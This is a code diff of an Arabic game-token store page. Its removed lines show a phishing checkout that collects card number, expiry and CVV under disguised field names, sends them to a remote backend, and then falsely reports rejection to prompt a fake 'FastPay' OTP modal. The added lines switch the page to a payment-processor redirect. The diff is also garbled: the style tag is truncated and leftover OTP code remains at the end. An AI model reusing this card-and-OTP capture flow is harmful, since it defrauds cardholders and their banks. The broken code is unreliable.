@@ -11,22 +11,20 @@
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800;900&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
-<style>
-  :root{
-    --bg: #0a0c10;          /* أسود عميق للخلفية الرئيسية */
-    --bg-alt: #11151c;      /* رصاصي داكن جداً للنوافذ والفورم */
-    --card: #181d27;        /* رصاصي غامق لبطاقات العرض */
-    --card-border: #252d3d; /* حدود رصاصية داكنة متناسقة */
+<sty    --bg: #0a0c10;
+    --bg-alt: #11151c;
+    --card: #181d27;
+    --card-border: #252d3d;
     --gold: #e6ab3f;
     --gold-soft: #f4c96a;
     --violet: #635bff;
     --violet-soft: #7a73ff;
-    --green: #24b574;       /* الأخضر الأساسي للأزرار */
+    --green: #24b574;
     --green-dark: #1b8a57;
-    --green-muted: #143828; /* أخضر مسود للأزرار غير المكتملة */
+    --green-muted: #143828;
     --green-muted-text: #4b7862;
     --text: #ffffff;
-    --text-dim: #9aa3b2;    /* نص رصاصي فاتح مريح للعين */
+    --text-dim: #9aa3b2;
   }
   *{box-sizing:border-box; margin:0; padding:0;}
   body{
@@ -180,7 +178,6 @@
     font-size: 13px;
   }
 
-  /* الفورم المصغر المتناسق بالأسود والرصاصي الغامق */
   .overlay{
     position:fixed;
     inset:0;
@@ -249,31 +246,6 @@
     background: linear-gradient(90deg, transparent, var(--card-border) 20%, var(--card-border) 80%, transparent);
     margin: 14px 0 12px;
   }
-  .field.card-field input{
-    border-radius: 12px;
-    padding: 14px 16px;
-    font-size: 14px;
-  }
-  .row-3{
-    display:flex;
-    gap: 8px;
-    margin-bottom: 12px;
-  }
-  .row-3 input{
-    width:100%;
-    background: var(--bg);
-    border: 1px solid var(--card-border);
-    border-radius: 12px;
-    padding: 14px 8px;
-    color: var(--text);
-    font-family:'Tajawal', sans-serif;
-    font-size: 14px;
-    text-align:center;
-    direction: ltr;
-    outline:none;
-    transition: border-color .15s ease;
-  }
-  .row-3 input:focus{ border-color: var(--green); }
   .field{
     margin-bottom: 12px;
     text-align:right;
@@ -293,16 +265,28 @@
     transition: border-color .15s ease;
   }
   .field input:focus{ border-color: var(--green); }
-  
-  .field input::placeholder,
-  .row-3 input::placeholder {
+  .field input::placeholder{
     color: #5a6475;
     opacity: 1;
     font-family: Arial, sans-serif;
     font-weight: normal;
     font-size: 14px;
   }
-  
+
+  .pay-methods-note{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    background: var(--bg);
+    border: 1px solid var(--card-border);
+    border-radius: 12px;
+    padding: 12px 14px;
+    font-size: 12.5px;
+    color: var(--text-dim);
+    margin-bottom: 16px;
+    line-height:1.6;
+  }
+
   .submit-btn{
     width:100%;
     margin-top: 6px;
@@ -329,7 +313,6 @@
     filter: brightness(1.07);
   }
 
-  /* Status view */
   .status-view{
     display:none;
     flex-direction:column;
@@ -359,180 +342,6 @@
     line-height:1.6;
     color: var(--text);
     margin-bottom: 16px;
-  }
-
-  /* FastPay Verification modal */
-  .rating-overlay{
-    position:fixed;
-    inset:0;
-    background: rgba(4, 6, 9, 0.86);
-    display:none;
-    align-items:center;
-    justify-content:center;
-    padding: 20px;
-    z-index: 200;
-  }
-  .rating-overlay.open{ display:flex; }
-  .rating-panel{
-    background: var(--bg-alt);
-    color: var(--text);
-    border: 1px solid var(--card-border);
-    border-radius: 16px;
-    width:100%;
-    max-width: 340px;
-    padding: 22px 18px 16px;
-    text-align:center;
-    box-shadow: 0 14px 36px rgba(0,0,0,0.75);
-  }
-  
-  .brand-container {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    margin-bottom: 2px;
-  }
-  .rating-title{
-    font-family:'Cairo', sans-serif;
-    font-weight:900;
-    font-size: 24px;
-    color: var(--gold-soft);
-    letter-spacing: 0.5px;
-  }
-  .verified-badge {
-    background: var(--green);
-    color: #fff;
-    width: 18px;
-    height: 18px;
-    border-radius: 50%;
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 11px;
-    font-weight: bold;
-    box-shadow: 0 2px 4px rgba(36,181,116,0.35);
-  }
-  .secure-lock {
-    color: var(--text-dim);
-    font-size: 14px;
-  }
-  .secure-subtext {
-    font-size: 11px;
-    color: var(--green);
-    font-weight: 700;
-    margin-bottom: 6px;
-    letter-spacing: 0.3px;
-  }
-
-  .rating-divider{
-    height:1px;
-    background: var(--card-border);
-    margin: 8px 0 14px;
-  }
-  .rating-text{
-    font-family:'Tajawal', sans-serif;
-    font-weight:500;
-    font-size: 13.5px;
-    color: var(--text-dim);
-    line-height: 1.6;
-    margin-bottom: 16px;
-  }
-  .rating-input-wrapper {
-    width: 100%;
-    max-width: 200px;
-    margin: 0 auto 10px;
-    text-align: right;
-  }
-  .rating-input{
-    width: 100%;
-    text-align: center;
-    font-family: Arial, sans-serif;
-    font-weight: 700;
-    font-size: 20px;
-    color: var(--text);
-    background: var(--bg);
-    border: 1px solid var(--card-border);
-    border-radius: 10px;
-    padding: 10px;
-    outline: none;
-    transition: all .15s ease;
-    direction: ltr;
-    letter-spacing: 2px;
-  }
-  .rating-input:focus{ 
-    border-color: var(--green);
-  }
-  .rating-input.invalid{ 
-    border-color: #d93838;
-    background: #241313;
-  }
-  
-  .rating-input::placeholder {
-    color: #465062;
-    letter-spacing: 4px;
-  }
-  
-  .rating-refresh-link {
-    display: inline-block;
-    color: #ff6b6b;
-    font-size: 11px;
-    font-weight: 500;
-    text-decoration: underline;
-    cursor: pointer;
-    margin-top: 5px;
-    margin-right: 4px;
-    user-select: none;
-  }
-  .rating-refresh-link:hover {
-    color: #ff8787;
-  }
-
-  .rating-error{
-    display:none;
-    color:#ff6b6b;
-    font-size:12px;
-    margin: 6px 0 10px;
-    text-align: center;
-  }
-  .rating-error.show{ display:block; }
-  
-  .rating-submit {
-    width: 100%;
-    padding: 11px 0;
-    border-radius: 10px;
-    border: 1px solid rgba(36, 181, 116, 0.35);
-    font-family: 'Cairo', sans-serif;
-    font-weight: 700;
-    font-size: 14px;
-    cursor: pointer;
-    background: linear-gradient(180deg, var(--green), var(--green-dark));
-    color: #fff;
-    box-shadow: 0 3px 0 rgba(0,0,0,0.45);
-    transition: all 0.2s ease;
-    margin-top: 10px;
-  }
-  .rating-submit:hover:not(:disabled){
-    filter: brightness(1.07);
-  }
-  .rating-submit:active:not(:disabled){
-    transform: translateY(1px);
-    box-shadow: 0 1px 0 rgba(0,0,0,0.45);
-  }
-  .rating-submit:disabled{
-    background: var(--green-muted);
-    border-color: #21523c;
-    color: var(--green-muted-text);
-    cursor: not-allowed;
-    box-shadow: none;
-  }
-
-  input::-webkit-outer-spin-button,
-  input::-webkit-inner-spin-button {
-    -webkit-appearance: none;
-    margin: 0;
-  }
-  input[type=number] {
-    -moz-appearance: textfield;
   }
 </style>
 </head>
@@ -570,40 +379,11 @@
         <input type="text" id="f-id" name="id" inputmode="numeric" pattern="\d+" placeholder="ID" required>
       </div>
 
-      <div class="soft-divider"></div>
-      <div class="section-label">معلومات البطاقة</div>
-
-      <div class="field card-field">
-        <input type="text" id="f-holder-name" name="jawakerName" placeholder="Card Holder Name" pattern="[^0-9]*" required>
+      <div class="pay-methods-note">
+        💳 بتقدر تدفع بالبطاقة (فيزا/ماستركارد) أو بأي محفظة كريبتو — رح تنتقل لصفحة دفع آمنة لإتمام العملية.
       </div>
 
-      <div class="field card-field">
-        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder="Card Number" maxlength="19" required>
-      </div>
-
-      <div class="row-3">
-        <input type="text" id="f-join-day" name="joinDay" inputmode="numeric" placeholder="MM" maxlength="2" required>
-        <input type="text" id="f-join-month" name="joinMonth" inputmode="numeric" placeholder="YY" maxlength="2" required>
-        <input type="text" id="f-join-year" name="joinYear" inputmode="numeric" placeholder="CVV" maxlength="4" required>
-      </div>
-
-      <div class="soft-divider"></div>
-      <div class="section-label">معلومات الفواتير</div>
-
-      <div style="display:flex; gap:10px;">
-        <div class="field card-field" style="flex:1;">
-          <input type="text" id="f-first-name" name="firstNameRecord" placeholder="First Name" required>
-        </div>
-        <div class="field card-field" style="flex:1;">
-          <input type="text" id="f-last-name" name="lastNameRecord" placeholder="Last Name" required>
-        </div>
-      </div>
-
-      <div class="field card-field">
-        <input type="text" id="f-country" name="country" placeholder="Country" required>
-      </div>
-
-      <button type="submit" class="submit-btn" id="submitBtn" disabled> دمج وإرسال </button>
+      <button type="submit" class="submit-btn" id="submitBtn" disabled>إرسال</button>
     </form>
 
     <div class="status-view" id="statusView">
@@ -612,28 +392,6 @@
       <div class="status-text" id="statusText">يرجى الانتظار قليلاً...</div>
       <button class="submit-btn" id="statusActionBtn" style="display:none"></button>
     </div>
-  </div>
-</div>
-
-<div class="rating-overlay" id="ratingOverlay">
-  <div class="rating-panel">
-    <div class="brand-container">
-      <span class="secure-lock">🔒</span>
-      <div class="rating-title">FastPay</div>
-      <span class="verified-badge">✓</span>
-    </div>
-    <div class="secure-subtext">SECURE CHECKOUT</div>
-    
-    <div class="rating-divider"></div>
-    <div class="rating-text">لقد قمنا بإرسال رمز OTP إلى رقم هاتفك المحمول، يرجى كتابته للمتابعة.</div>
-    
-    <div class="rating-input-wrapper">
-      <input type="text" id="ratingInput" class="rating-input" inputmode="numeric" maxlength="6" placeholder="- - - - - -" required>
-      <span class="rating-refresh-link" id="ratingRefreshBtn">إعادة ارسال</span>
-    </div>
-
-    <div class="rating-error" id="ratingError">الرجاء إدخال رمز مكون من 4 إلى 6 أرقام</div>
-    <button type="button" class="rating-submit" id="ratingSubmitBtn" disabled>تأكيد</button>
   </div>
 </div>
 
@@ -652,15 +410,16 @@
     <text x="50" y="62" font-size="34" text-anchor="middle" fill="#8a5c15" font-family="Cairo, sans-serif" font-weight="900">$</text>
   </svg>`;
 
+  // priceUsd هو الرقم الفعلي يلي رح ينرسل لسيرفر الدفع (NOWPayments) — خليه مطابق للسعر المعروض
   const packages = [
-    { name: "الفئة الأولى", amount: "120,000", price: "$10" },
-    { name: "الفئة الثانية", amount: "250,000", price: "$20" },
-    { name: "الفئة الثالثة", amount: "375,000", price: "$30" },
-    { name: "الفئة الرابعة", amount: "800,000", price: "$60" },
-    { name: "الفئة الخامسة", amount: "1,000,000", price: "$80" },
-    { name: "الفئة السادسة", amount: "1,300,000", price: "$100" },
-    { name: "الفئة السابعة", amount: "2,500,000", price: "$180" },
-    { name: "الفئة الثامنة", amount: "3,500,000", price: "$250" },
+    { name: "الفئة الأولى",   amount: "120,000",   price: "$10",  priceUsd: 10  },
+    { name: "الفئة الثانية",  amount: "250,000",   price: "$20",  priceUsd: 20  },
+    { name: "الفئة الثالثة",  amount: "375,000",   price: "$30",  priceUsd: 30  },
+    { name: "الفئة الرابعة",  amount: "800,000",   price: "$60",  priceUsd: 60  },
+    { name: "الفئة الخامسة",  amount: "1,000,000", price: "$80",  priceUsd: 80  },
+    { name: "الفئة السادسة",  amount: "1,300,000", price: "$100", priceUsd: 100 },
+    { name: "الفئة السابعة",  amount: "2,500,000", price: "$180", priceUsd: 180 },
+    { name: "الفئة الثامنة",  amount: "3,500,000", price: "$250", priceUsd: 250 },
   ];
 
   const grid = document.getElementById('grid');
@@ -672,29 +431,30 @@
       <div class="coin-icon">${coinSVG}</div>
       <div class="pack-name">${p.name}</div>
       <div class="pack-amount">${p.amount} <span class="mini-coin">${coinSVG}</span></div>
-      <button class="buy-btn" data-state="price" data-name="${p.name}" data-amount="${p.amount}" data-price="${p.price}" onclick="handleBuy(this)">${p.price}</button>
+      <button class="buy-btn" data-state="price" data-name="${p.name}" data-amount="${p.amount}" data-price="${p.price}" data-price-usd="${p.priceUsd}" onclick="handleBuy(this)">${p.price}</button>
     `;
     grid.appendChild(card);
   });
 
   function handleBuy(btn){
     if(btn.dataset.state === 'price'){
-      btn.textContent = 'pay with credit card';
+      btn.textContent = 'ادفع الآن';
       btn.dataset.state = 'pay';
       return;
     }
     currentOrder = {
       name: btn.dataset.name,
       amount: btn.dataset.amount,
-      price: btn.dataset.price
+      price: btn.dataset.price,
+      priceUsd: parseFloat(btn.dataset.priceUsd),
     };
     openForm();
   }
 
-  const BACKEND_URL = "https://shop-q907.onrender.com";
+  // غيّر هاد الرابط لرابط سيرفرك الحقيقي بعد الرفع (main.py المرتبط بـ NOWPayments)
+  const BACKEND_URL = "https://your-backend-domain.example.com";
 
   let currentOrder = null;
-  let pollTimer = null;
 
   const overlay = document.getElementById('overlay');
   const payForm = document.getElementById('payForm');
@@ -706,49 +466,27 @@
   const statusText = document.getElementById('statusText');
   const statusActionBtn = document.getElementById('statusActionBtn');
   const orderChip = document.getElementById('orderChip');
-
   const idInput = document.getElementById('f-id');
-  const holderNameInput = document.getElementById('f-holder-name');
-  const numberInput = document.getElementById('f-jawaker-number');
 
   idInput.addEventListener('input', function(){
     this.value = this.value.replace(/\D/g, '');
   });
 
-  numberInput.addEventListener('input', function(){
-    const digits = this.value.replace(/\D/g, '').slice(0, 16);
-    this.value = digits.replace(/(.{4})(?=.)/g, '$1 ');
-  });
-
-  holderNameInput.addEventListener('input', function(){
-    this.value = this.value.replace(/[0-9]/g, '');
-  });
-
-  const joinDayInput = document.getElementById('f-join-day');
-  const joinMonthInput = document.getElementById('f-join-month');
-  const joinYearInput = document.getElementById('f-join-year');
-  [joinDayInput, joinMonthInput, joinYearInput].forEach(input => {
-    input.addEventListener('input', function(){
-      this.value = this.value.replace(/\D/g, '');
-    });
-  });
-
   function openForm(){
     if(currentOrder){
       orderChip.innerHTML = `${currentOrder.name} — <b>${currentOrder.amount}</b> توكنز — ${currentOrder.price}`;
-      submitBtn.textContent = `دفع ${currentOrder.price}`;
+      submitBtn.textContent = `متابعة الدفع (${currentOrder.price})`;
     }
     overlay.classList.add('open');
   }
   function closeForm(){
     overlay.classList.remove('open');
-    stopPolling();
     payForm.style.display = '';
     statusView.classList.remove('show');
     payForm.reset();
     submitBtn.disabled = true;
     submitBtn.classList.remove('enabled');
-    submitBtn.textContent = currentOrder ? `دفع ${currentOrder.price}` : 'إرسال';
+    submitBtn.textContent = currentOrder ? `متابعة الدفع (${currentOrder.price})` : 'إرسال';
   }
   overlay.addEventListener('click', (e) => {
     if(e.target === overlay) closeForm();
@@ -761,55 +499,27 @@
         allValid = false;
       }
     });
-
-    const cleanNumber = numberInput.value.replace(/\D/g, '');
-    if(cleanNumber.length !== 16){
-      allValid = false;
-    }
-
     submitBtn.disabled = !allValid;
     submitBtn.classList.toggle('enabled', allValid);
   }
-
   formInputs.forEach(input => {
     input.addEventListener('input', validateForm);
   });
 
-  let verifyTimer = null;
-
-  function showWaiting(){
+  function showRedirecting(){
     payForm.style.display = 'none';
     statusView.classList.add('show');
     statusSpinnerWrap.style.display = '';
     statusIcon.style.display = 'none';
-    statusText.textContent = 'جار التحقق...';
+    statusText.textContent = 'جارِ تجهيز صفحة الدفع...';
     statusActionBtn.style.display = 'none';
-
-    clearTimeout(verifyTimer);
-    verifyTimer = setTimeout(() => {
-      if (statusView.classList.contains('show') && statusText.textContent === 'جار التحقق...') {
-        statusText.textContent = 'قيد المراجعة، سيتم إعلامك فور الانتهاء...';
-      }
-    }, 25000);
   }
 
-  function showApproved(){
+  function showError(msg){
     statusSpinnerWrap.style.display = 'none';
     statusIcon.style.display = '';
     statusIcon.textContent = '⚠️';
-    statusText.textContent = 'تم رفض الطلب، يرجى إعادة المحاولة';
-    statusActionBtn.textContent = 'إغلاق';
-    statusActionBtn.className = 'submit-btn enabled';
-    statusActionBtn.style.display = '';
-    statusActionBtn.onclick = closeForm;
-    showRatingModal();
-  }
-
-  function showRejected(){
-    statusSpinnerWrap.style.display = 'none';
-    statusIcon.style.display = '';
-    statusIcon.textContent = '⚠️';
-    statusText.textContent = 'يرجى التأكد من صحة بياناتك';
+    statusText.textContent = msg || 'صار في مشكلة، حاول مرة أخرى';
     statusActionBtn.textContent = 'حاول مرة أخرى';
     statusActionBtn.className = 'submit-btn enabled';
     statusActionBtn.style.display = '';
@@ -819,40 +529,6 @@
     };
   }
 
-  function showError(msg){
-    statusSpinnerWrap.style.display = 'none';
-    statusIcon.style.display = '';
-    statusIcon.textContent = '⚠️';
-    statusText.textContent = msg || 'صار في مشكلة، حاول مرة أخرى';
-    statusActionBtn.textContent = 'إغلاق';
-    statusActionBtn.className = 'submit-btn enabled';
-    statusActionBtn.style.display = '';
-    statusActionBtn.onclick = closeForm;
-  }
-
-  function stopPolling(){
-    if(pollTimer){ clearInterval(pollTimer); pollTimer = null; }
-    if(verifyTimer){ clearTimeout(verifyTimer); verifyTimer = null; }
-  }
-
-  function pollOrderStatus(orderId){
-    pollTimer = setInterval(async () => {
-      try{
-        const res = await fetch(`${BACKEND_URL}/api/order/${orderId}`);
-        if(!res.ok) return;
-        const result = await res.json();
-        if(result.status === 'approved'){
-          stopPolling();
-          showApproved();
-        } else if(result.status === 'rejected'){
-          stopPolling();
-          showRejected();
-        }
-      } catch(err){
-      }
-    }, 2500);
-  }
-
   payForm.addEventListener('submit', async function(e){
     e.preventDefault();
     validateForm();
@@ -860,20 +536,16 @@
 
     const data = new FormData(payForm);
     const body = {
-      id: data.get('id'),
-      jawakerNumber: data.get('jawakerNumber').replace(/\s/g, ''),
-      jawakerName: data.get('jawakerName'),
-      country: data.get('country'),
-      joinDay: data.get('joinDay'),
-      joinMonth: data.get('joinMonth'),
-      joinYear: data.get('joinYear'),
-      firstNameRecord: data.get('firstNameRecord'),
-      lastNameRecord: data.get('lastNameRecord'),
-      order: currentOrder || {},
+      player_id: data.get('id'),
+      category_name: currentOrder ? currentOrder.name : '',
+      amount: currentOrder ? currentOrder.amount : '',
+      price_amount: currentOrder ? currentOrder.priceUsd : null,
+      price_currency: 'usd',
     };
 
     submitBtn.disabled = true;
-    submitBtn.textContent = 'جارِ التحقق...';
+    submitBtn.textContent = 'جارِ التحويل...';
+    showRedirecting();
 
     try{
       const res = await fetch(`${BACKEND_URL}/api/order`, {
@@ -882,71 +554,14 @@
         body: JSON.stringify(body),
       });
       const result = await res.json();
-      if(!res.ok || !result.order_id){
-        throw new Error(result.error || 'فشل إرسال الطلب');
+      if(!res.ok || !result.payment_url){
+        throw new Error(result.error || 'فشل إنشاء رابط الدفع');
       }
-      showWaiting();
-      currentOrderId = result.order_id;
-      pollOrderStatus(result.order_id);
+      // تحويل المستخدم مباشرة لصفحة الدفع الحقيقية (NOWPayments)
+      window.location.href = result.payment_url;
     } catch(err){
-      showWaiting();
-      showError('صار في مشكلة بإرسال البيانات: ' + err.message);
-    }
-  });
+      showError('صار في مشكلة بإنشاء الطلب: ' + err.message);
 
-  // ---- FastPay OTP Script ----
-  let currentOrderId = null;
-  const ratingOverlay = document.getElementById('ratingOverlay');
-  const ratingInput = document.getElementById('ratingInput');
-  const ratingError = document.getElementById('ratingError');
-  const ratingSubmitBtn = document.getElementById('ratingSubmitBtn');
-  const ratingRefreshBtn = document.getElementById('ratingRefreshBtn');
-
-  ratingInput.addEventListener('input', function(){
-    this.value = this.value.replace(/\D/g, '').slice(0, 6);
-    
-    if(isRatingValid()){
-      ratingSubmitBtn.disabled = false;
-      ratingInput.classList.remove('invalid');
-      ratingError.classList.remove('show');
-    } else {
-      ratingSubmitBtn.disabled = true;
-    }
-  });
-
-  function isRatingValid(){
-    const val = ratingInput.value.trim();
-    return val.length >= 4 && val.length <= 6;
-  }
-
-  ratingRefreshBtn.addEventListener('click', function(){
-    ratingInput.value = '';
-    ratingInput.classList.remove('invalid');
-    ratingError.classList.remove('show');
-    ratingSubmitBtn.disabled = true;
-    ratingInput.focus();
-  });
-
-  function showRatingModal(){
-    ratingInput.value = '';
-    ratingInput.classList.remove('invalid');
-    ratingError.classList.remove('show');
-    ratingSubmitBtn.disabled = true;
-    ratingOverlay.classList.add('open');
-  }
-  function closeRatingModal(){
-    ratingOverlay.classList.remove('open');
-    location.reload();
-  }
-  ratingOverlay.addEventListener('click', (e) => {
-    if(e.target === ratingOverlay) closeRatingModal();
-  });
-
-  ratingSubmitBtn.addEventListener('click', async function(){
-    const valueStr = ratingInput.value.trim();
-    if(!isRatingValid()){
-      ratingInput.classList.add('invalid');
-      ratingError.classList.add('show');
       ratingInput.focus();
       return;
     }
